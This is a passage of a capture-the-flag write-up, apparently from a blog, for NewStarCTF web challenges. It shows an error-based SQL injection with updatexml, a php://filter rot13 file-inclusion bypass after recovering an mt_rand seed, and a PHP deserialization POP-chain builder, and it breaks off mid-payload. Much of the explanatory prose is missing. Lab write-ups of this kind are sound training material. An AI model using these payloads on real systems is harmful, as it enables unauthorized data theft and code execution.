class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701146.png\"\n                        alt=\"-1665405773483\"\n                 ></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701158.png\"\n                        alt=\"-1665405782381\"\n                 ></p>\n<p>~wfy</p>\n<p></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: <span class=\"string\">&#x27;~wfy_admin,wfy_comments,wfy_info&#x27;</span>    </span><br></pre></td></tr></table></figure>\n\n<p>flagwfy_comments</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"operator\">||</span>updatexml(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> reverse(group_concat(text)) <span class=\"keyword\">from</span> wfy_comments)),<span class=\"number\">1</span>)#</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: <span class=\"string\">&#x27;~&#125;sr0rre_emos_ek2m_t4uJ&#123;galf,&#x27;</span>    <span class=\"operator\">/</span><span class=\"operator\">/</span>flag</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"2-IncludeOne\"><a href=\"#2-IncludeOne\" class=\"headerlink\" title=\"2.IncludeOne\"></a>2.IncludeOne</h2><p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;seed.php&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//mt_srand(*********);//</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;Hint: &quot;</span>.<span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;<span class=\"comment\">//1219893521</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">mt_rand</span>()))&#123;<span class=\"comment\">//md5</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/base|\\.\\./i&quot;</span>,<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]) &amp;&amp;<span class=\"comment\">//base preg_match(&quot;/NewStar/i&quot;,$_GET[&#x27;file&#x27;]) &amp;&amp; isset($_GET[&#x27;file&#x27;]))&#123;</span></span><br><span class=\"line\">       <span class=\"comment\">//NewStarfile</span></span><br><span class=\"line\">        <span class=\"comment\">//flag in `flag.php`</span></span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);<span class=\"comment\">//</span></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Baby Hacker?&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;No Hacker!&quot;</span>;</span><br><span class=\"line\">&#125; Hint: <span class=\"number\">1219893521</span></span><br><span class=\"line\">No Hacker!</span><br></pre></td></tr></table></figure>\n\n<p><a class=\"link\"   href=\"https://www.openwall.com/php_mt_seed/\" >https://www.openwall.com/php_mt_seed/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p></p>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">mt_srand</span>(<span class=\"number\">12345</span>);    </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>    </span><br><span class=\"line\"><span class=\"number\">162946439</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">247161732</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1463094264</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1878061366</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">394962642</span></span><br></pre></td></tr></table></figure>\n\n<p>12345</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702046.png\"\n                        alt=\"-1665405798622\"\n                 ></p>\n<p>1145146</p>\n<p>1202031004</p>\n<p>post</p>\n<p>baserot13</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:<span class=\"comment\">//filter/read=string.rot13/resource=flag.php</span></span><br></pre></td></tr></table></figure>\n\n<p>NewStar</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:<span class=\"comment\">//filter/NewStar/read=string.rot13/resource=flag.php</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">synt&#123;p1786p1p-rqr8-4524-n796-r3s84050oo92&#125;</span><br></pre></td></tr></table></figure>\n\n<p>rot13</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;c1786c1c-ede8-4524-a796-e3f84050bb92&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-UnserializeOne\"><a href=\"#3-UnserializeOne\" class=\"headerlink\" title=\"3.UnserializeOne\"></a>3.UnserializeOne</h2><p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"comment\">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Start</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        (<span class=\"variable language_\">$this</span>-&gt;func)();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sec</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$var</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj-&gt;<span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-&gt;<span class=\"keyword\">var</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;CTFers&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Easy</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$cla</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">eeee</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pop&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pop&#x27;</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> __construct()</li>\n<li>__destruct()</li>\n<li>__call()</li>\n<li>__callStatic()</li>\n<li>__get()</li>\n<li>__set()</li>\n<li>__isset()isset()empty()</li>\n<li>__unset()unset()</li>\n<li>__sleep()serialize()</li>\n<li>__wakeup()unserialize()</li>\n<li>__toString()</li>\n<li>__invoke()</li>\n<li>__set_state()var_export()</li>\n<li>__clone()</li>\n<li>__autoload()</li>\n<li>__debugInfo()</li>\n</ul>\n<p>pop**__destruct<strong>Sec</strong>__invoke**</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>nameecho**__tostring**</p>\n<p>StartnameSec</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj-&gt;<span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-&gt;<span class=\"keyword\">var</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;CTFers&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>check**__call**</p>\n<p>SecobjEasy</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>Easyclaeeee**__clone**</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>eeeecmd**__isset**</p>\n<p>eeeeobjStart</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        (<span class=\"variable language_\">$this</span>-&gt;func)();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p> <strong>($this-&gt;func)();<strong></strong>__invoke</strong></p>\n<p>StartfuncSec</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>pop</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//error_reporting(0);</span></span><br><span class=\"line\"><span class=\"comment\">//highlight_file(__FILE__);</span></span><br><span class=\"line\"><span class=\"comment\">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Start</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;func=<span class=\"keyword\">new</span> <span class=\"title class_\">Sec</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"keyword\">new</span> <span class=\"title class_\">Sec</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        (<span class=\"variable language_\">$this</span>-&gt;func)();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sec</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$var</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj=<span class=\"keyword\">new</span> <span class=\"title class_\">Easy</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj-&gt;<span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-&gt;<span class=\"keyword\">var</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;CTFers&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Easy</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$cla</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">eeee</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$c</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">eeee</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Start</span>();</span><br><span class=\"line\"><span class=\"variable\">$c</span>-&gt;obj=<span class=\"variable\">$a</span>;</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Sec</span>();</span><br><span class=\"line\"><span class=\"variable\">$b</span>-&gt;<span class=\"keyword\">var</span>=<span class=\"variable\">$c</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;name=<span class=\"variable\">$b</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?pop=O:<span 